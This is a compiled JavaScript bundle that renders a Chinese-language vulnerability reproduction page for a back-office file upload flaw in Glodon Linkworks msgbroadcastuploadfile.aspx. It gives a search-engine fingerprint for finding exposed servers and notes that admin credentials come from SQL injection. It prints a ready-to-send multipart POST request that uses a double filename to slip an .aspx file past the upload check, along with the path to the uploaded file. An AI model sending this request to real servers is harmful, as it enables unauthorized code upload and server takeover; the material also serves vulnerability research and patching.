(window.webpackJsonp=window.webpackJsonp||[]).push([[164],{2604:function(s,a,t){s.exports=t.p+"assets/img/1691730736125-bbb199fa-01fb-4790-b2a7-d813481d8d88-20230812091116146.704862b0.png"},2605:function(s,a,t){s.exports=t.p+"assets/img/1691801728377-50f7e7cb-080f-47fa-9e3d-ad9666fc99c8.b448fbb4.png"},2606:function(s,a,t){s.exports=t.p+"assets/img/1691733300613-63fefc8c-2e2d-478e-97b8-01ce3f9daf56.83a28cf7.png"},2607:function(s,a,t){s.exports=t.p+"assets/img/1691802188135-636da27c-837c-432a-88bc-2e215572b2af.d9636237.png"},3513:function(s,a,t){"use strict";t.r(a);var r=t(68),e=Object(r.a)({},(function(){var s=this,a=s._self._c;return a("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[a("h1",{attrs:{id:"广联达-linkworks-msgbroadcastuploadfile-aspx-后台文件上传漏洞"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#广联达-linkworks-msgbroadcastuploadfile-aspx-后台文件上传漏洞"}},[s._v("#")]),s._v(" 广联达 Linkworks msgbroadcastuploadfile.aspx 后台文件上传漏洞")]),s._v(" "),a("h2",{attrs:{id:"漏洞描述"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞描述"}},[s._v("#")]),s._v(" 漏洞描述")]),s._v(" "),a("p",[s._v("广联达 Linkworks msgbroadcastuploadfile.aspx 存在后台文件上传漏洞，攻击者通过SQL注入获取管理员信息后，可以登陆发送请求包获取服务器权限")]),s._v(" "),a("h2",{attrs:{id:"漏洞影响"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞影响"}},[s._v("#")]),s._v(" 漏洞影响")]),s._v(" "),a("p",[s._v("广联达 Linkworks")]),s._v(" "),a("h2",{attrs:{id:"网络测绘"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#网络测绘"}},[s._v("#")]),s._v(" 网络测绘")]),s._v(" "),a("p",[s._v('web.body="/Services/Identification/"')]),s._v(" "),a("h2",{attrs:{id:"漏洞复现"}},[a("a",{staticClass:"header-anchor",attrs:{href:"#漏洞复现"}},[s._v("#")]),s._v(" 漏洞复现")]),s._v(" "),a("p",[s._v("登陆页面")]),s._v(" "),a("p",[a("img",{attrs:{src:t(2604),alt:"img"}})]),s._v(" "),a("p",[s._v("GTP.IM.Services.Group.WebSite.GTP.IM.Services.Group 存在文件上传，上传后在当前目录 Upload下")]),s._v(" "),a("p",[a("img",{attrs:{src:t(2605),alt:"img"}})]),s._v(" "),a("p",[s._v("通过SQL注入获取管理员账号密码后登陆后台上传文件,验证POC")]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("POST")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("gtp"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("im"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("services"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("group"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("msgbroadcastuploadfile"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("aspx "),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("HTTP")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("1.1")]),s._v("\nHost"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" \nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" multipart"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("form"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" boundary"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v("WebKitFormBoundaryFfJZ4PlAZBixjELj\nCookie"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" "),a("span",{pre:!0,attrs:{class:"token number"}},[s._v("0")]),s._v("_styleName"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),s._v("styleA\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v("WebKitFormBoundaryFfJZ4PlAZBixjELj\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Disposition"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" form"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("data"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v(" filename"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"1.aspx"')]),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(";")]),s._v("filename"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("=")]),a("span",{pre:!0,attrs:{class:"token string double-quoted-string"}},[s._v('"1.jpg"')]),s._v("\nContent"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("Type"),a("span",{pre:!0,attrs:{class:"token punctuation"}},[s._v(":")]),s._v(" application"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("text\n\nTest\n\n"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v("WebKitFormBoundaryFfJZ4PlAZBixjELj"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("--")]),s._v("\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br"),a("span",{staticClass:"line-number"},[s._v("2")]),a("br"),a("span",{staticClass:"line-number"},[s._v("3")]),a("br"),a("span",{staticClass:"line-number"},[s._v("4")]),a("br"),a("span",{staticClass:"line-number"},[s._v("5")]),a("br"),a("span",{staticClass:"line-number"},[s._v("6")]),a("br"),a("span",{staticClass:"line-number"},[s._v("7")]),a("br"),a("span",{staticClass:"line-number"},[s._v("8")]),a("br"),a("span",{staticClass:"line-number"},[s._v("9")]),a("br"),a("span",{staticClass:"line-number"},[s._v("10")]),a("br"),a("span",{staticClass:"line-number"},[s._v("11")]),a("br"),a("span",{staticClass:"line-number"},[s._v("12")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2606),alt:"img"}})]),s._v(" "),a("div",{staticClass:"language-php line-numbers-mode"},[a("pre",{pre:!0,attrs:{class:"language-php"}},[a("code",[a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("GTP")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),a("span",{pre:!0,attrs:{class:"token constant"}},[s._v("IM")]),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Services"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Group"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("Upload"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("/")]),s._v("xxx"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("xxx"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v("-")]),s._v("test"),a("span",{pre:!0,attrs:{class:"token operator"}},[s._v(".")]),s._v("aspx\n")])]),s._v(" "),a("div",{staticClass:"line-numbers-wrapper"},[a("span",{staticClass:"line-number"},[s._v("1")]),a("br")])]),a("p",[a("img",{attrs:{src:t(2607),alt:"img"}})])])}),[],!1,null,null,null);a.default=e.exports}}]);